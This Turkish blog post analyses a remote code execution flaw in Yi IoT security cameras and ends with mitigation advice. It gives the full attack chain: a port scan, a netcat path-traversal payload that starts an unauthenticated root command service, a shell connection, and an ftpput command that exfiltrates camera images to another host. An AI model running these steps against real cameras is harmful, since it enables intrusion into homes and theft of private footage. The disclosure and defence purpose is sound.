---
title: "Yi IoT Güvenlik Kameralarında Uzaktan Kod Çalıştırma (RCE) Zafiyeti Analizi"
date: 2025-06-23T21:00:00+03:00
draft: false
author: "Alperen Keskin"
tags: ["siber güvenlik", "iot", "rce", "kamera güvenliği", "zafiyet analizi"]
categories: ["Zafiyet Analizi"]
---

## Yi IoT Güvenlik Kameralarında Uzaktan Kod Çalıştırma (RCE) Zafiyeti

Akıllı ev sistemlerinde kullanılan güvenlik kameraları, evimizi daha güvenli hale getirmek için tasarlansa da bazen bu cihazlar kendileri ciddi bir güvenlik riski haline gelebiliyor. Bu yazıda, Yi IoT marka IP kameralarında tespit edilen ve GitHub’da [Yasha-ops](https://github.com/Yasha-ops/RCE-YiIOT) tarafından yayımlanan bir **uzaktan kod çalıştırma (RCE)** zafiyetini inceleyeceğiz.

---

## 🚨 Zafiyetin Özeti

Yi IoT kameraları üzerinde çalışan iki servis, saldırganlara cihaz üzerinde tam yetkiyle işlem yapma imkânı tanımaktadır:

- **Port 6789**: Dosya çalıştırmaya açık olan “daemon” servisi  
- **Port 999**: Doğrudan root yetkisiyle çalışan “cmd” servisi

Bu iki servis bir arada kullanılarak cihazda kalıcı root erişimi sağlanabilir.

---

## 🧪 Teknik Analiz

### 🔌 1. Daemon Servisi (Port 6789)

- Kamera, port 6789 üzerinden gelen verileri doğrudan işler.
- Herhangi bir doğrulama yapılmadan gelen dizin bilgileri yürütülür.
- `../../../usr/bin/cmd` gibi bir **directory traversal** girdisi ile `/usr/bin/cmd` çalıştırılabilir.

### ⚙️ 2. CMD Servisi (Port 999)

- `/usr/bin/cmd` çalıştırıldığında kamera, 999 numaralı port üzerinden gelen TCP bağlantılarını dinlemeye başlar.
- Bu servis, **şifresiz ve kimlik doğrulamasız** olarak çalışır.
- Bağlantı kuran herkes, cihazda **root yetkileriyle komut çalıştırabilir**.

---

## 🧰 Saldırı Senaryosu (Yerel Ağ Üzerinden)

### 🔍 IoT Cihazının Tespiti

Cihazı bulmak için öncelikle IoT kameranın yerel ağdaki IP adresi `nmap` ile tespit edilmelidir. Örneğin:

```bash
nmap -p 6789,999 --open 192.168.1.0/24
```

Bu tarama sonucunda belirtilen portlar açık olan cihazlar listelenecek ve kameranın IP’si bulunabilecektir.

### Gerekli Araçlar

- `nmap` (port taraması için)
- `nc` (netcat, bağlantı sağlamak için)
- Kamerayla aynı ağda olmak (örneğin Wi-Fi bağlantısı)

### 🧱 Adım 1: Komut Dinleyici Açtırmak

```bash
echo -ne "../../../usr/bin/cmd" | nc 192.168.1.20 6789
```

### 🧱 Adım 2: CMD Servisine Bağlanmak

```bash
nc 192.168.1.20 999
```

Bağlantı kurulduktan sonra artık root erişiminiz vardır:

```bash
id
whoami
ls /
```

---

## 📤 Kamera Dosyalarına Erişim ve Veri Sızdırma

Kamera üzerinde çalışan `cmd` servisi aracılığıyla sistemdeki tüm dosyalara erişebilirsiniz. Özellikle dikkat çeken dosya ve dizinler:

- `/tmp/motion.jpg` — Hareket algılandığında çekilen son kare
- `/home/base/` — Kamera konfigürasyonları
- `/system/init/start.sh` — Açılışta çalışan betikler

Cihazda gömülü `ftpput` komutu, bu dosyaları yerel ağdaki başka bir FTP sunucusuna göndermek için kullanılabilir:

```bash
ftpput -u anonymous -p anonymous 192.168.1.5 sızdırılan.jpg /tmp/motion.jpg
```

> ⚠️ Not: FTP kullanımı zorunlu değildir. Ancak veri dışa aktarmak isteyen bir saldırgan için faydalı bir yöntemdir.

---

## 🎯 Etki ve Güvenlik Riskleri

| Risk Türü                | Açıklama                                             |
|--------------------------|------------------------------------------------------|
| Root erişimi             | Tam denetim, yapılandırma ve sistem dosyalarına erişim |
| Görüntü/log hırsızlığı   | Kamera verileri dışa sızdırılabilir                 |
| Kalıcı zararlı kurulum  | Cihaza arka kapı veya zararlı yazılım yerleştirilebilir |
| Ağ içi yayılma riski     | Diğer IoT cihazları veya bilgisayarlara zıplama yapılabilir |

---

## 🔐 Korunma Yöntemleri

- Kamera firmware’ini **üretici sitesinden güncel tutun**.
- Modem veya güvenlik duvarınızdan **6789 ve 999 portlarını kapatın**.
- Kameraları izole bir VLAN veya ayrı ağda konumlandırın.
- **Varsayılan şifreleri değiştirin**, her cihaz için benzersiz kimlik bilgileri kullanın.
- Gelişmiş kullanıcılar için: IDS/IPS sistemleri ile TCP trafiğini analiz edin.

---

## 🧩 Sonuç

Yi IoT güvenlik kameralarında keşfedilen bu zafiyet, IoT cihazlarının gerekli güvenlik önlemleri alınmadığında ciddi riskler barındırabileceğini göstermektedir. Ev veya ofis ağında bulunan bu tür cihazlar, çoğu zaman gözden kaçırılmakta ve saldırganlar için kolay bir hedef haline gelmektedir. Bu nedenle, IoT cihazlarının düzenli olarak denetlenmesi ve güvenlik önlemlerinin güncel tutulması büyük önem taşır.

---

## 🔗 Kaynaklar

- GitHub: [https://github.com/Yasha-ops/RCE-YiIOT](https://github.com/Yasha-ops/RCE-YiIOT)  
- CVE Referansları: CVE-2025-29659, CVE-2025-29660